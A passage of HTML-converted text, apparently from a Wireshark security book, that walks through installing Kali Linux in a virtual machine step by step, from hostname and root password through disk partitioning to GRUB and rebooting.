single;font-size:15.0000pt;" >27</span></u><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, we chose &#8220;w4sp&#8221; as our system name.</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="782"  height="673"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker91757.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark136" ></a><span><a href="#_bookmark135" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-27:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Entering a hostname</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section73" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The installation prompts for a domain. This is not necessary; you may choose to continue, as shown in<a name="_bookmark137" ></a>&nbsp;</span><span><a href="#_bookmark138" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-28</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="137.5"  height="0" ></td></tr><tr><td></td><td><img width="745"  height="230"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker91972.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark138" ></a><span><a href="#_bookmark137" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-28:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Skipping the domain</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The next prompt is for the password for the root account, as shown in<a name="_bookmark139" ></a>&nbsp;</span><span><a href="#_bookmark141" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-29</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="135"  height="0" ></td></tr><tr><td></td><td><img width="750"  height="410"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker92154.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark141" ></a><span><a href="#_bookmark139" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-29:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Entering a root password</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Obviously, you should choose this password carefully. You will be prompted to enter the password again to verify.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The next prompt will be to select your time zone. Select the time zone that corresponds to your location.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The next prompt is configuring the disk partition. Select the default</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section74" ><p class=MsoBodyText  style="margin-top:4.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >option of Guided &#8211; Use Entire Disk, as shown in<a name="_bookmark142" ></a>&nbsp;</span><span><a href="#_bookmark143" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-30</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="131.25"  height="0" ></td></tr><tr><td></td><td><img width="759"  height="308"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker92610.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark143" ></a><span><a href="#_bookmark142" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-30:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Partitioning the disk</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The installation process requests you confirm the disk as presented. For our machine,<a name="_bookmark145" ></a>&nbsp;</span><span><a href="#_bookmark146" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-31</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows we confirmed to partition SCSI1 (0,0,0).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="138.75"  height="0" ></td></tr><tr><td></td><td><img width="743"  height="202"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker92856.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark146" ></a><span><a href="#_bookmark145" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-31:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Confirming the disk</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Following the confirmation, you are prompted to select whether you want all files in one partition. Select the default, All Files in One Partition, as shown in<a name="_bookmark147" ></a>&nbsp;</span><span><a href="#_bookmark148" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-32</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section75" ><p class=MsoBodyText  style="margin-left:14.0000pt;" ><img width="760"  height="293"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker93129.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark148" ></a><span><a href="#_bookmark147" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-32:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Confirming a single partition</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >At this point, you are shown an overview of your partition-related choices. Select the option Finish Partitioning and Write Changes</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to Disk to continue, as shown in<a name="_bookmark149" ></a>&nbsp;</span><span><a href="#_bookmark150" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.5000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >2-33</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="360"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker93417.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark150" ></a><span><a href="#_bookmark149" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-33:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Writing changes to the</span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);letter-spacing:-1.4500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >disk</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >One final confirmation prompt: Select Yes to write the changes to the disk, as shown in<a name="_bookmark151" ></a>&nbsp;</span><span><a href="#_bookmark153" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-34</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section76" ><p class=MsoBodyText  style="margin-left:23.7500pt;" ><img width="729"  height="275"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker93626.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark153" ></a><span><a href="#_bookmark151" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-34:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Confirming disk changes</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Once confirmed, the installation proceeds to copy data to the disk. As</span><span><a href="#_bookmark155" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;you have come to expect with any installation, a status bar (see </span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >2-35</span></u><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >) shows the progress. Along the bottom of the full VM application</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;window, you should see a number of icons symbolizing the virtual hardware. The first one, a hard drive, denotes activity. The installation might take several minutes to finish.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section77" ><p class=MsoBodyText ><img width="782"  height="716"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker94121.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:3.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark155" ></a><span><a href="#_bookmark154" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-35:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >The installation progress bar</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After data copying is finished, you are prompted whether you want to have a network mirror (see<a name="_bookmark156" ></a>&nbsp;</span><span><a href="#_bookmark158" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-36</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="141.25"  height="0" ></td></tr><tr><td></td><td><img width="738"  height="197"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker94341.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section78" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark158" ></a><span><a href="#_bookmark156" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-36:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >The option for a network mirror</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A network mirror is the source from which your Linux distro will update. If you are keeping an Internet connection to the host machine, then select to use a network mirror. The installation process then has an opportunity to enter a proxy, if applicable, as shown in<a name="_bookmark159" ></a>&nbsp;</span><span><a href="#_bookmark160" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-37</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="137.5"  height="0" ></td></tr><tr><td></td><td><img width="745"  height="245"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker94733.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark160" ></a><span><a href="#_bookmark159" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-37:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Network connection proxy</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If your Internet connection does not rely on a proxy, leave the field blank and continue. After this step, the installation will retrieve updates for the Linux distribution. Depending on your connection speed and how long it has been since the distro you&#8217;re using was released, the subsequent update might take several minutes to an hour.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After the update completes, it is time to install the GRUB boot loader. Your new Kali Linux VM has only one operating system (Kali Linux), and the GRUB boot loader recognizes that. Continue to the prompt where you confirm the device for boot loader installation. Select the</span><span><a href="#_bookmark162" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;drive presented, which in our case is /dev/sda, as shown in </span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >38</span></u><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section79" ><p class=MsoBodyText  style="margin-left:12.5000pt;" ><img width="767"  height="245"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker95525.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark162" ></a><span><a href="#_bookmark161" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-38:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >GRUB boot loader</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:17.2500pt;" ><a name="_bookmark163" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After a few progress bars showing the final installation steps, you are prompted to restart the system (see<a name="_bookmark164" ></a>&nbsp;</span><span><a href="#_bookmark165" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-39</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). Restart the system to your freshly installed Kali Linux VM. Once Kali reboots, you are prompted for the username and password. Log in as root.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="138.75"  height="0" ></td></tr><tr><td></td><td><img width="744"  height="164"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker95887.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark165" ></a><span><a href="#_bookmark164" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-39:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Installation is complete</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the next section we introduce the W4SP Lab, a full environment of systems for experimenting and testing with Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" 